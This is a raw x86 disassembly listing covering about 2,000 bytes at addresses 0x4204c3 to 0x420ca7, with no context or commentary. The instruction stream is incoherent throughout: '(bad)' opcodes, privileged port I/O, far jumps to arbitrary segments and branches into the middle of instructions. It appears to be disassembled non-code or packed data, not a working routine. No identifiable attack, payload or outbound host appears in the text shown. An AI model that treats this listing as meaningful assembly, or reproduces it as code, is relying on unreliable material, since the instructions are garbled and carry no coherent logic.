  4204c3:	cmp    ebp,DWORD PTR [ecx-0x8]
  4204c6:	ss iret 
  4204c8:	fstp   st(1)
  4204ca:	xchg   ebp,eax
  4204cb:	(bad)  
  4204cc:	out    dx,eax
  4204cd:	sbb    DWORD PTR [edx-0x22b534fc],esp
  4204d3:	loopne 0x420536
  4204d5:	cli    
  4204d6:	outs   dx,DWORD PTR ds:[esi]
  4204d7:	repz inc ebx
  4204d9:	add    bh,BYTE PTR [edi]
  4204db:	mov    ds:0x744d1bb,al
  4204e0:	cmp    esi,DWORD PTR [ebx-0xbadf2c]
  4204e6:	in     eax,dx
  4204e7:	sbb    ch,bl
  4204e9:	lea    ebx,[edx+eiz*4+0x3]
  4204ed:	adc    bl,cl
  4204ef:	out    0xaa,eax
  4204f1:	add    cl,ch
  4204f3:	jg     0x4204e6
  4204f5:	cmp    eax,0x3663b3be
  4204fa:	mov    bh,0xf7
  4204fc:	mov    edi,0x9d5365e2
  420501:	jecxz  0x420507
  420503:	sub    al,0xf8
  420505:	cmp    ch,BYTE PTR [ebx]
  420507:	ret    0x9400
  42050a:	xchg   DWORD PTR [ebx+0x14c765b8],eax
  420510:	and    eax,0x35fab8f3
  420515:	pop    ds
  420516:	adc    DWORD PTR [esi],eax
  420518:	jl     0x42055d
  42051a:	into   
  42051b:	sub    BYTE PTR [ebx+0x33],0x2a
  42051f:	iret   
  420520:	pop    es
  420521:	jno    0x42054c
  420523:	ret    
  420524:	inc    ebx
  420525:	nop
  420526:	or     bh,BYTE PTR [ebx]
  420528:	outs   dx,DWORD PTR ds:[esi]
  420529:	paddsw mm3,QWORD PTR [ebx+0x6f94aafe]
  420530:	sbb    eax,0x81ffa251
  420535:	aam    0xb1
  420537:	jo     0x42053a
  420539:	inc    ebp
  42053a:	js     0x4204e0
  42053c:	inc    edi
  42053d:	or     dl,bh
  42053f:	stc    
  420540:	and    DWORD PTR [edx+0x6955746a],ebx
  420546:	es sub edi,edx
  420549:	cs loope 0x42059c
  42054c:	sbb    DWORD PTR [eax],ecx
  42054e:	fild   DWORD PTR fs:[esi-0x1f]
  420552:	jmp    0x420590
  420554:	sqrtps xmm0,XMMWORD PTR [ebx]
  420557:	and    al,0xa4
  420559:	pop    es
  42055a:	out    dx,al
  42055b:	les    eax,FWORD PTR cs:[ebp-0x4a]
  42055f:	xchg   ebx,eax
  420560:	loope  0x420519
  420562:	sbb    al,BYTE PTR [eax]
  420564:	jl     0x4205c0
  420566:	mov    al,0x77
  420568:	mov    eax,ds:0x44b2d8b6
  42056d:	mov    DWORD PTR [esi-0x5c909dc4],0xda3910ec
  420577:	sub    eax,0x5a79b6ba
  42057c:	sbb    edx,edx
  42057e:	jecxz  0x4205e3
  420580:	mov    ds:0x70d835e4,al
  420585:	or     bh,BYTE PTR [esi-0x8602421]
  42058b:	push   ecx
  42058c:	out    0x19,al
  42058e:	ss icebp 
  420590:	outs   dx,DWORD PTR ds:[esi]
  420591:	js     0x420544
  420593:	arpl   WORD PTR [ebx+0x7faf0f9a],ax
  420599:	pop    es
  42059a:	imul   esi,edi,0xa17c449a
  4205a0:	adc    eax,0x75eefc15
  4205a5:	inc    esp
  4205a6:	sub    DWORD PTR [ebx+esi*4+0x6e4cb147],edi
  4205ad:	aad    0x90
  4205af:	jmp    0x6169:0xc7dbe7d7
  4205b6:	inc    ebp
  4205b7:	jmp    0x420618
  4205b9:	push   es
  4205ba:	inc    ecx
  4205bb:	mov    ecx,0xe99fae5d
  4205c0:	adc    DWORD PTR [esi-0x649ab24d],edx
  4205c6:	addr16 and al,0xba
  4205c9:	jp     0x42063d
  4205cb:	mov    ebp,0x1ad676aa
  4205d0:	(bad)  
  4205d1:	test   al,0xdd
  4205d3:	mov    dl,0x77
  4205d5:	adc    DWORD PTR [ebp+eax*2-0x6a6381c9],edx
  4205dc:	xor    DWORD PTR [ebp-0xf],eax
  4205df:	and    eax,0x73c61bd0
  4205e4:	adc    ebx,ecx
  4205e6:	push   0x43ed5f43
  4205eb:	push   ss
  4205ec:	mov    dl,0xb8
  4205ee:	pop    ebp
  4205ef:	(bad)  
  4205f0:	popf   
  4205f1:	retf   0x7a65
  4205f4:	xchg   ebp,eax
  4205f5:	retf   0x77c
  4205f8:	mov    al,ds:0x68d787f2
  4205fd:	ins    BYTE PTR es:[edi],dx
  4205fe:	jmp    0x420619
  420600:	inc    ecx
  420601:	outs   dx,BYTE PTR ds:[esi]
  420602:	sbb    DWORD PTR [edi+edx*1-0xde7a6ad],ebx
  420609:	xor    al,0x14
  42060b:	jle    0x4205c8
  42060d:	sbb    eax,0xa3fb310b
  420612:	xor    edx,DWORD PTR [edi-0x4d1c423e]
  420618:	jb     0x420624
  42061a:	or     ch,BYTE PTR [edx+0x6b7ada13]
  420620:	cmp    DWORD PTR [esp+esi*1-0x42f50378],ebp
  420627:	xor    dh,BYTE PTR [esi-0x79]
  42062a:	mov    bh,0x66
  42062c:	repnz std 
  42062e:	mov    bl,0x20
  420630:	fwait
  420631:	adc    al,0x8
  420633:	fisubr DWORD PTR [esi+eiz*4-0x3102e739]
  42063a:	push   ebx
  42063b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42063c:	jmp    0x7891:0xd3f355cc
  420643:	mov    cl,0xe6
  420645:	mov    eax,0xc76a1a3f
  42064a:	ss mov edx,0x64432467
  420650:	lahf   
  420651:	mov    ebx,0x4a20d03b
  420656:	mov    edx,0x9e84883f
  42065b:	jle    0x420620
  42065d:	retf   0xc76f
  420660:	jnp    0x42068a
  420662:	ficom  DWORD PTR [edx-0x51d59a70]
  420668:	push   eax
  420669:	xor    ebp,DWORD PTR [ebx-0x1d]
  42066c:	pop    esp
  42066d:	sub    edx,DWORD PTR [ebx+ebx*1]
  420670:	les    esp,FWORD PTR [ebp-0x661e6dda]
  420676:	rcr    DWORD PTR [esi+eax*2],cl
  420679:	iret   
  42067a:	mov    ebp,0xf1711acd
  42067f:	cld    
  420680:	out    dx,al
  420681:	mov    al,0xc9
  420683:	dec    ebx
  420684:	cdq    
  420685:	dec    esp
  420686:	dec    edx
  420687:	xor    esi,DWORD PTR [ebx]
  420689:	(bad)  
  42068a:	idiv   DWORD PTR [ebx+0x2ae7d42f]
  420690:	xor    eax,0xba679505
  420695:	push   ecx
  420696:	out    0xa5,al
  420698:	sub    DWORD PTR [ecx+eax*2],edi
  42069b:	mov    WORD PTR [esi+0x1f],ss
  42069e:	push   ss
  42069f:	sub    ch,BYTE PTR [ecx+0x3f3b857d]
  4206a5:	dec    ecx
  4206a6:	sti    
  4206a7:	lods   eax,DWORD PTR ds:[esi]
  4206a8:	les    ebp,FWORD PTR [eax]
  4206aa:	retf   0x461c
  4206ad:	int3   
  4206ae:	stos   BYTE PTR es:[edi],al
  4206af:	ret    
  4206b0:	mov    BYTE PTR [esp+edi*4-0x617d3a2a],bl
  4206b7:	jp     0x4206a5
  4206b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206ba:	imul   ebp,DWORD PTR [edx],0x3e617470
  4206c0:	pop    ss
  4206c1:	jmp    0x215c:0xf1ad6ab
  4206c8:	sub    al,BYTE PTR ds:0x8d9b606f
  4206ce:	call   0xcbc3:0x6008cd2c
  4206d5:	add    al,BYTE PTR [ecx]
  4206d7:	ja     0x4206d4
  4206d9:	sub    dl,0x21
  4206dc:	push   cs
  4206dd:	enter  0xc7e5,0x49
  4206e1:	sahf   
  4206e2:	pop    ebx
  4206e3:	fucom  st(7)
  4206e5:	sub    eax,0x9dda681a
  4206ea:	sbb    bh,BYTE PTR [ebx+0x6]
  4206ed:	xchg   esp,eax
  4206ee:	and    BYTE PTR [edi],bl
  4206f0:	(bad)  
  4206f1:	lods   al,BYTE PTR ds:[esi]
  4206f2:	inc    ebx
  4206f3:	sbb    al,0x91
  4206f5:	jmp    0x4206b2
  4206f7:	loop   0x4206ef
  4206f9:	pop    edi
  4206fa:	jmp    0xb1f:0x62dc183f
  420701:	int3   
  420702:	in     al,dx
  420703:	ret    0x4b36
  420706:	jecxz  0x420753
  420708:	cmc    
  420709:	xchg   esp,eax
  42070a:	pushf  
  42070b:	jle    0x420705
  42070d:	xor    al,0x66
  42070f:	scas   eax,DWORD PTR es:[edi]
  420710:	imul   edx,ebp,0x58700d37
  420716:	retf   
  420717:	pop    es
  420718:	cmp    dh,BYTE PTR [ebx]
  42071a:	add    al,BYTE PTR [esi+0x6f749c5e]
  420720:	push   esp
  420721:	or     DWORD PTR [ecx+edx*4],edx
  420724:	xor    DWORD PTR [ebp-0x52dbaaeb],esi
  42072a:	and    BYTE PTR [esi+eax*1+0x50],ah
  42072e:	push   edx
  42072f:	mov    eax,ds:0x42e10440
  420734:	fnstenv [eax-0x3e]
  420737:	pop    ss
  420738:	popa   
  420739:	int    0x77
  42073b:	fsubr  QWORD PTR [esi-0x7b96e383]
  420741:	sahf   
  420742:	in     eax,0xf6
  420744:	popa   
  420745:	iret   
  420746:	jmp    0x420769
  420748:	sbb    dh,BYTE PTR [edx+0x64bb768a]
  42074e:	es retf 0xbd9d
  420752:	pop    eax
  420753:	mov    cl,0x7e
  420755:	inc    esi
  420756:	mov    eax,ds:0xb9640ae4
  42075b:	and    eax,DWORD PTR [edi-0x68]
  42075e:	test   bl,al
  420760:	loop   0x420713
  420762:	clc    
  420763:	clc    
  420764:	push   ebx
  420765:	in     al,dx
  420766:	mov    al,ds:0xcdadf53a
  42076b:	mov    ecx,0xd0fa281c
  420770:	mov    ecx,es
  420772:	xchg   DWORD PTR [ecx],ecx
  420774:	jae    0x420783
  420776:	nop
  420777:	imul   esp,DWORD PTR [eax],0x4d
  42077a:	mov    dl,0xa4
  42077c:	and    bl,BYTE PTR [ebx]
  42077e:	out    dx,al
  42077f:	repnz xchg edx,eax
  420781:	sub    al,0x53
  420783:	inc    edx
  420784:	fucomi st,st(7)
  420786:	shl    BYTE PTR [eax],0xea
  420789:	mov    esp,0x88ad253
  42078e:	or     ah,BYTE PTR [edx+ebx*1]
  420791:	aad    0xaf
  420793:	js     0x420805
  420795:	(bad)  
  420796:	add    BYTE PTR [esi+ebx*1],0x57
  42079a:	jb     0x4207cc
  42079c:	fcmovu st,st(5)
  42079e:	out    0x5e,eax
  4207a0:	add    BYTE PTR [edx+ebx*8+0x6d5e6e2d],0x35
  4207a8:	lea    esi,[ecx+ecx*8-0x3a]
  4207ac:	xor    eax,DWORD PTR [edi]
  4207ae:	ins    BYTE PTR es:[edi],dx
  4207af:	scas   eax,DWORD PTR es:[edi]
  4207b0:	mov    cl,0x87
  4207b2:	das    
  4207b3:	or     ebp,DWORD PTR [esi-0x7805e536]
  4207b9:	es pop esi
  4207bb:	mov    ebp,0x9d8a2eb9
  4207c0:	ret    0x56be
  4207c3:	xchg   ebx,eax
  4207c4:	add    eax,0x9495a8fb
  4207c9:	fwait
  4207ca:	scas   eax,DWORD PTR es:[edi]
  4207cb:	jae    0x420842
  4207cd:	jne    0x420798
  4207cf:	arpl   WORD PTR [edi-0x16a415bb],bp
  4207d5:	mov    ds,ecx
  4207d7:	retf   
  4207d8:	sub    eax,0xed4b2cee
  4207dd:	adc    BYTE PTR [ebp+0xf35727e],0x43
  4207e4:	in     eax,dx
  4207e5:	stos   DWORD PTR es:[edi],eax
  4207e6:	je     0x4207b2
  4207e8:	imul   ebp,DWORD PTR [ebx],0xffffffa1
  4207eb:	and    BYTE PTR [edi],cl
  4207ed:	add    eax,0x8bb66c0d
  4207f2:	xchg   DWORD PTR [ebx],ebp
  4207f4:	in     eax,0x27
  4207f6:	out    dx,eax
  4207f7:	xchg   esi,eax
  4207f8:	cs pop es
  4207fa:	test   BYTE PTR [esi],bl
  4207fc:	xchg   DWORD PTR [eax+eiz*2-0x28],eax
  420800:	sbb    ebp,DWORD PTR [esi]
  420802:	xchg   BYTE PTR [edi+0xe],cl
  420805:	stos   BYTE PTR es:[edi],al
  420806:	shl    DWORD PTR [esi+0x632966f4],0x82
  42080d:	sbb    al,0x36
  42080f:	add    ah,BYTE PTR [ebx-0x8]
  420812:	jmp    0x5cbd:0x498caf1c
  420819:	(bad)  ds:0x7d90ea9d
  42081f:	lea    ebx,[ecx+0x5a1af624]
  420825:	lods   eax,DWORD PTR ds:[esi]
  420826:	mov    WORD PTR [edi],fs
  420828:	rcr    BYTE PTR [edx],cl
  42082a:	dec    edx
  42082b:	pusha  
  42082c:	push   es
  42082d:	cwde   
  42082e:	cmp    DWORD PTR [edx+0x5a],ebx
  420831:	sti    
  420832:	imul   ecx,DWORD PTR [eax],0xcbbd5a81
  420838:	sub    BYTE PTR [esi],al
  42083a:	cmp    al,0x16
  42083c:	outs   dx,DWORD PTR ds:[esi]
  42083d:	jecxz  0x420884
  42083f:	mov    al,ds:0x90138394
  420844:	inc    esi
  420845:	add    eax,0xfa9ea240
  42084a:	mov    bl,0xd3
  42084c:	and    DWORD PTR [edi+0x376ae581],esi
  420852:	sub    edx,esp
  420854:	sbb    edi,DWORD PTR [edx+ebp*4-0x7f27281a]
  42085b:	rcl    DWORD PTR [ecx+0x39],1
  42085e:	call   0x4274:0xcc6418c6
  420865:	scas   eax,DWORD PTR es:[edi]
  420866:	push   esi
  420867:	xchg   esp,eax
  420868:	addr16 in eax,0xf7
  42086b:	das    
  42086c:	pop    esp
  42086d:	fadd   st,st(7)
  42086f:	fnsave [ebx]
  420871:	jo     0x420846
  420873:	adc    bl,BYTE PTR [edx+0x7c]
  420876:	xlat   BYTE PTR ds:[ebx]
  420877:	loopne 0x4208f7
  420879:	rcr    DWORD PTR [ebx],cl
  42087b:	sub    DWORD PTR [esp+esi*2+0x1b],ecx
  42087f:	adc    DWORD PTR ds:[esi+0x20de45e2],ebx
  420886:	push   eax
  420887:	ds xchg ebx,eax
  420889:	nop
  42088a:	sub    BYTE PTR [edi+0x2b6663de],0xd
  420891:	jno    0x4208f3
  420893:	and    DWORD PTR [esi+edi*8+0x64],0x3f
  420898:	enter  0xd70f,0x1a
  42089c:	mov    esi,ecx
  42089e:	aaa    
  42089f:	in     eax,dx
  4208a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a1:	mov    edx,0x76f78091
  4208a6:	mov    eax,0x28e1ca43
  4208ab:	nop
  4208ac:	sbb    DWORD PTR [ebx-0x6e],ecx
  4208af:	scas   eax,DWORD PTR es:[edi]
  4208b0:	jnp    0x420880
  4208b2:	adc    ah,dl
  4208b4:	in     al,dx
  4208b5:	jge    0x420933
  4208b7:	and    al,0x94
  4208b9:	dec    esi
  4208ba:	cmp    al,0x97
  4208bc:	pop    ecx
  4208bd:	push   ecx
  4208be:	pushf  
  4208bf:	mov    dl,0x82
  4208c1:	lods   eax,DWORD PTR ds:[esi]
  4208c2:	add    bl,BYTE PTR [esp+edx*1+0x1]
  4208c6:	sub    bh,BYTE PTR [eax-0x501a5cee]
  4208cc:	addr16 inc ecx
  4208ce:	mov    ecx,0x56c26626
  4208d3:	adc    eax,0x28859ec0
  4208d8:	xchg   BYTE PTR [ebp-0x19d02009],dl
  4208de:	sub    BYTE PTR ds:[ebx+0x2774e0f6],ch
  4208e5:	jmp    0x4208a6
  4208e7:	ja     0x42090c
  4208e9:	mov    ah,cl
  4208eb:	xchg   esi,eax
  4208ec:	or     ah,ah
  4208ee:	xchg   esp,eax
  4208ef:	adc    ebx,DWORD PTR [ebx+0x29]
  4208f2:	adc    al,0x19
  4208f4:	sub    bh,cl
  4208f6:	push   ss
  4208f7:	push   eax
  4208f8:	sbb    eax,0x796a2687
  4208fd:	mov    al,0x5b
  4208ff:	out    0xb6,al
  420901:	out    dx,eax
  420902:	call   0x11c9d827
  420907:	lea    edi,[ebp+0x2b]
  42090a:	leave  
  42090b:	dec    eax
  42090c:	push   cs
  42090d:	adc    BYTE PTR [ecx+ebp*8],ch
  420910:	outs   dx,BYTE PTR ds:[esi]
  420911:	jno    0x420955
  420913:	push   edi
  420914:	mov    ds:0x64bc80ec,al
  420919:	sub    DWORD PTR [eax+0x17a500e5],esp
  42091f:	fcomp  QWORD PTR [esi+ebx*4+0x7bb0f605]
  420926:	add    eax,0xe32b3d7e
  42092b:	pop    ebp
  42092c:	jecxz  0x4208e3
  42092e:	mov    edx,DWORD PTR [esi+0x109065ae]
  420934:	stos   DWORD PTR es:[edi],eax
  420935:	mov    dl,0xa2
  420937:	sub    edx,edx
  420939:	push   es
  42093a:	lods   al,BYTE PTR ds:[esi]
  42093b:	clc    
  42093c:	mov    eax,0x74438c9e
  420941:	xchg   ebp,eax
  420942:	mov    eax,ds:0xb2adcdb1
  420947:	arpl   WORD PTR [edi+0x31f313c3],ax
  42094d:	add    BYTE PTR [ecx],dl
  42094f:	adc    DWORD PTR [esi+0x4e33435d],edx
  420955:	test   BYTE PTR [ecx+ecx*4+0x267016d2],bh
  42095c:	cli    
  42095d:	das    
  42095e:	xor    BYTE PTR [ebp+eiz*8-0x3c004c95],dh
  420965:	sub    ah,BYTE PTR [ecx]
  420967:	mov    eax,ds:0x91eedf35
  42096c:	lock test DWORD PTR [esi+0x50],esi
  420970:	sub    al,0x1f
  420972:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420973:	pop    esi
  420974:	mov    edi,0x5da0ac63
  420979:	push   edi
  42097a:	push   0xbc93b49d
  42097f:	in     al,0xdd
  420981:	xor    DWORD PTR [edx],ecx
  420983:	sub    BYTE PTR [ecx+edi*1+0x39],dh
  420987:	retf   0x70af
  42098a:	add    BYTE PTR [ecx],dl
  42098c:	test   eax,0xd83ff1df
  420991:	mul    BYTE PTR [eax-0x53]
  420994:	push   ds
  420995:	jns    0x420929
  420997:	or     dl,BYTE PTR [edi-0x2b]
  42099a:	inc    esp
  42099b:	jmp    0x5101:0x5a1d618
  4209a2:	sub    DWORD PTR [eax],ecx
  4209a4:	xor    DWORD PTR [edi+0x1be2e028],ebx
  4209aa:	imul   DWORD PTR [eax]
  4209ac:	mov    cl,0xe9
  4209ae:	iret   
  4209af:	pop    es
  4209b0:	sbb    eax,0x2c2afab
  4209b5:	das    
  4209b6:	add    BYTE PTR [eax-0x60],al
  4209b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4209ba:	test   al,0x7
  4209bc:	(bad)  
  4209bd:	pop    ecx
  4209be:	or     dl,BYTE PTR [esi]
  4209c0:	xor    al,BYTE PTR [edi+0x589da39d]
  4209c6:	push   ds
  4209c7:	cmp    DWORD PTR [edi+edx*4],ecx
  4209ca:	xchg   BYTE PTR [edx+0x275d5a6f],dl
  4209d0:	fild   WORD PTR [esi+0x7f8d60f5]
  4209d6:	cdq    
  4209d7:	mov    esi,0x4576d726
  4209dc:	jo     0x420a19
  4209de:	cs ret 0x62a7
  4209e2:	call   0x765544f4
  4209e7:	in     eax,0xa1
  4209e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209ea:	xchg   ebx,eax
  4209eb:	mov    DWORD PTR [ecx+0x5d],edi
  4209ee:	sbb    ch,al
  4209f0:	clc    
  4209f1:	xchg   esi,eax
  4209f2:	push   ds
  4209f3:	or     ah,BYTE PTR [edx+eiz*8+0x67e21e0a]
  4209fa:	xor    DWORD PTR [edx-0x67df2c1d],ebp
  420a00:	mov    dh,al
  420a02:	inc    ebp
  420a03:	sbb    eax,0xeb5b4469
  420a08:	dec    ecx
  420a09:	fimul  DWORD PTR [edx+esi*8+0x19a57fe7]
  420a10:	pop    ss
  420a11:	cmp    al,bl
  420a13:	push   es
  420a14:	sti    
  420a15:	jmp    0xaf3e:0x3eb39def
  420a1c:	mov    eax,0x47e27002
  420a21:	call   0x9545:0x4bddfee3
  420a28:	test   BYTE PTR [edx-0x3ae329be],bh
  420a2e:	stc    
  420a2f:	sbb    esp,DWORD PTR [esi+ebx*2-0x18140136]
  420a36:	sbb    eax,0x21b0eb3c
  420a3b:	sti    
  420a3c:	cmp    eax,0x6299d188
  420a41:	aaa    
  420a42:	push   edi
  420a43:	jle    0x420aab
  420a45:	sbb    edi,ebp
  420a47:	xchg   esi,eax
  420a48:	add    BYTE PTR [ebx+ebx*8+0x61979968],bh
  420a4f:	pop    edi
  420a50:	sub    BYTE PTR [edx],dh
  420a52:	aaa    
  420a53:	das    
  420a54:	dec    esi
  420a55:	cs aad 0x5e
  420a58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a59:	pop    eax
  420a5a:	add    DWORD PTR [eax-0x5f],ebp
  420a5d:	sub    DWORD PTR [eax-0x34],edi
  420a60:	inc    eax
  420a61:	sbb    dh,BYTE PTR [esi+0x73c7addd]
  420a67:	mov    bh,0x5c
  420a69:	mov    esp,0xdc0e06e4
  420a6e:	das    
  420a6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a70:	(bad)  
  420a71:	ins    BYTE PTR es:[edi],dx
  420a72:	pop    esi
  420a73:	pop    ebx
  420a74:	pop    ss
  420a75:	into   
  420a76:	jne    0x420a12
  420a78:	test   eax,0x2a2a766d
  420a7e:	sub    dl,ch
  420a80:	jo     0x420aab
  420a82:	pusha  
  420a83:	jmp    ebx
  420a85:	xor    DWORD PTR [ecx],ebp
  420a87:	jp     0x420ac5
  420a89:	(bad)  
  420a8a:	leave  
  420a8b:	pop    esi
  420a8c:	aad    0xfa
  420a8e:	or     BYTE PTR [ebx],dl
  420a90:	or     BYTE PTR [edi],al
  420a92:	adc    DWORD PTR [ebp-0x8],0xffc6d85d
  420a99:	xlat   BYTE PTR ds:[ebx]
  420a9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a9b:	daa    
  420a9c:	not    BYTE PTR [edi-0x5cd32200]
  420aa2:	push   0x9552ba18
  420aa7:	enter  0x1af1,0x78
  420aab:	retf   
  420aac:	xor    eax,0xc35ece91
  420ab1:	adc    BYTE PTR [eax-0xa],al
  420ab4:	(bad)  
  420ab5:	(bad)  [edi-0x737e44d3]
  420abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420abc:	adc    edx,DWORD PTR [ebx]
  420abe:	fiadd  DWORD PTR [eax+0x7c075fa3]
  420ac4:	es xor al,0xcb
  420ac7:	call   0xa3b0cc4d
  420acc:	(bad)  
  420acd:	(bad)  
  420ace:	mov    ebp,0xaed9f2bb
  420ad3:	fldcw  WORD PTR [ebp+ecx*8-0x76de0935]
  420ada:	pop    ecx
  420adb:	mov    cl,0x1c
  420add:	test   DWORD PTR [esi+0x5005c21c],ebp
  420ae3:	ret    0x82f1
  420ae6:	int    0x6f
  420ae8:	pop    es
  420ae9:	jmp    0x420a78
  420aeb:	mov    ds:0xeef794ab,al
  420af0:	rcr    DWORD PTR [ecx+0xf96dbee],0xda
  420af7:	sbb    eax,0x558122f9
  420afc:	mov    al,ds:0x4c5be206
  420b01:	or     dh,ch
  420b03:	loopne 0x420add
  420b05:	je     0x420b17
  420b07:	retf   0xaac4
  420b0a:	mov    bh,0x8
  420b0c:	inc    eax
  420b0d:	xchg   edx,eax
  420b0e:	aas    
  420b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b10:	adc    al,0xa3
  420b12:	loop   0x420b03
  420b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b15:	cmp    dl,bh
  420b17:	idiv   DWORD PTR [esp+esi*8-0x76c8ade6]
  420b1e:	inc    esp
  420b1f:	push   0xa100291a
  420b24:	mov    ebp,0x55a2ca5a
  420b29:	cmp    bl,BYTE PTR ds:[eax-0x6f9b3670]
  420b30:	pop    ss
  420b31:	dec    edi
  420b32:	add    edi,ebx
  420b34:	dec    ebp
  420b35:	popa   
  420b36:	lea    ecx,[eax-0x6aab33c4]
  420b3c:	sbb    cl,BYTE PTR [edx+0x280ec80e]
  420b42:	and    DWORD PTR [ecx+0x5ff31309],esi
  420b48:	jne    0x420acf
  420b4a:	xor    DWORD PTR [edi+0x22],ecx
  420b4d:	xchg   esi,eax
  420b4e:	xchg   ebp,eax
  420b4f:	mov    dl,0x2a
  420b51:	cmp    cl,BYTE PTR [ebx+0x16d446c2]
  420b57:	popf   
  420b58:	mov    al,ds:0xbc98019a
  420b5d:	outs   dx,BYTE PTR ds:[esi]
  420b5e:	pop    eax
  420b5f:	(bad)  
  420b60:	dec    esp
  420b61:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b62:	(bad)  
  420b63:	xlat   BYTE PTR ds:[ebx]
  420b64:	arpl   di,bp
  420b66:	mov    bl,cl
  420b68:	sar    ah,1
  420b6a:	rol    BYTE PTR [eax+edi*8],1
  420b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420b6e:	int    0x20
  420b70:	lea    eax,[esi-0x33413673]
  420b76:	mov    BYTE PTR [edx+0x62],dh
  420b79:	add    bl,BYTE PTR [ebp-0x5b]
  420b7c:	dec    edx
  420b7d:	sbb    esi,ebx
  420b7f:	adc    eax,DWORD PTR [ecx-0x7e]
  420b82:	sub    al,0x8c
  420b84:	sbb    dl,BYTE PTR [ebx]
  420b86:	les    edi,FWORD PTR [edx-0x59e0a67c]
  420b8c:	xor    bl,BYTE PTR [ebp+0x4d6d0b59]
  420b92:	push   ds
  420b93:	(bad)  
  420b94:	out    0x8,eax
  420b96:	xor    DWORD PTR ds:0x37f09f33,edx
  420b9c:	outs   dx,DWORD PTR ds:[esi]
  420b9d:	dec    esp
  420b9e:	dec    esp
  420b9f:	sbb    edx,0x2b
  420ba2:	mov    ah,0x42
  420ba4:	outs   dx,BYTE PTR ds:[esi]
  420ba5:	inc    edi
  420ba6:	cmc    
  420ba7:	loop   0x420c23
  420ba9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420baa:	and    BYTE PTR [ebx-0x6f],ch
  420bad:	xor    DWORD PTR [ecx+0x40],ebx
  420bb0:	inc    ebp
  420bb1:	dec    ebx
  420bb2:	lea    edi,[ecx+0x4a244e15]
  420bb8:	dec    ebp
  420bb9:	test   eax,0x90e4e4e0
  420bbe:	add    edi,DWORD PTR [ebx+0x4f]
  420bc1:	hlt    
  420bc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420bc3:	in     eax,dx
  420bc4:	arpl   WORD PTR [edx-0x5d],dx
  420bc7:	frstor [edx-0xdda10d]
  420bcd:	jbe    0x420b52
  420bcf:	pop    ecx
  420bd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bd1:	fwait
  420bd2:	mov    bl,0xec
  420bd4:	xchg   ebx,eax
  420bd5:	mov    edx,0x540e253e
  420bda:	sbb    ebp,esi
  420bdc:	gs enter 0x3c20,0xc8
  420be1:	shr    BYTE PTR [ebx+0x8],1
  420be4:	iret   
  420be5:	das    
  420be6:	fistp  WORD PTR [ebp-0x3584341b]
  420bec:	jecxz  0x420bed
  420bee:	lahf   
  420bef:	shl    DWORD PTR [edi+0x293516cc],0x90
  420bf6:	outs   dx,BYTE PTR ds:[esi]
  420bf7:	mov    ebp,0xcbef4a9b
  420bfc:	sahf   
  420bfd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420bfe:	sub    al,0x8e
  420c00:	add    BYTE PTR fs:[edx-0x4b3521d2],bh
  420c07:	xchg   esp,eax
  420c08:	out    dx,eax
  420c09:	pop    edi
  420c0a:	loop   0x420c33
  420c0c:	mov    cs,ebp
  420c0e:	sub    BYTE PTR [edx],dh
  420c10:	adc    eax,0xd72166a2
  420c15:	pop    esp
  420c16:	add    dh,BYTE PTR [esi-0x1]
  420c19:	leave  
  420c1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c1b:	xchg   edx,eax
  420c1c:	and    ecx,DWORD PTR [eax]
  420c1e:	call   0xa704:0x855a840d
  420c25:	xor    BYTE PTR [ecx-0x51d7bc13],dl
  420c2b:	dec    al
  420c2d:	push   es
  420c2e:	jb     0x420c06
  420c30:	or     DWORD PTR [esp+ecx*4+0x165af515],ebp
  420c37:	int3   
  420c38:	lea    esi,[ebx]
  420c3a:	sti    
  420c3b:	or     BYTE PTR [edi],cl
  420c3d:	inc    ebp
  420c3e:	dec    esi
  420c3f:	mov    eax,0x2ac5eaf9
  420c44:	in     al,0xa8
  420c46:	push   cs
  420c47:	mov    ch,al
  420c49:	cmp    ch,dl
  420c4b:	nop
  420c4c:	jp     0x420cc0
  420c4e:	les    eax,FWORD PTR [edx]
  420c50:	leave  
  420c51:	or     ebx,DWORD PTR [ecx+0x3d]
  420c54:	pop    ebp
  420c55:	out    0x54,eax
  420c57:	test   bh,al
  420c59:	inc    eax
  420c5a:	dec    ebx
  420c5b:	test   al,0x95
  420c5d:	fs jns 0x420c60
  420c60:	adc    DWORD PTR [esi+0xb5f0c54],edx
  420c66:	mov    ebx,0x59103aad
  420c6b:	inc    edi
  420c6c:	mov    ebp,0x91d79da2
  420c71:	loop   0x420c73
  420c73:	test   al,0x29
  420c75:	fild   DWORD PTR [ecx-0x5f]
  420c78:	sub    cl,BYTE PTR [ebx-0x49]
  420c7b:	dec    ebx
  420c7c:	in     eax,0x2a
  420c7e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c7f:	pop    ecx
  420c80:	or     bl,BYTE PTR ss:[ebx+ecx*4+0x23]
  420c85:	ret    0x406d
  420c88:	and    BYTE PTR [ebx+edi*4],dl
  420c8b:	mov    ah,0x9b
  420c8d:	xor    ch,BYTE PTR [edx+0x6adcb4bb]
  420c93:	mov    esp,0x23442d25
  420c98:	rcr    DWORD PTR [eax+ecx*2-0x52],0x68
  420c9d:	cwde   
  420c9e:	lods   al,BYTE PTR ds:[esi]
  420c9f:	jle    0x420c28
  420ca1:	dec    ecx
  420ca2:	inc    ebp
  420ca3:	popf   
  420ca4:	mov    cl,0x8c
  420ca6:	dec    esi
  420ca7:	mov    bl,0x3c
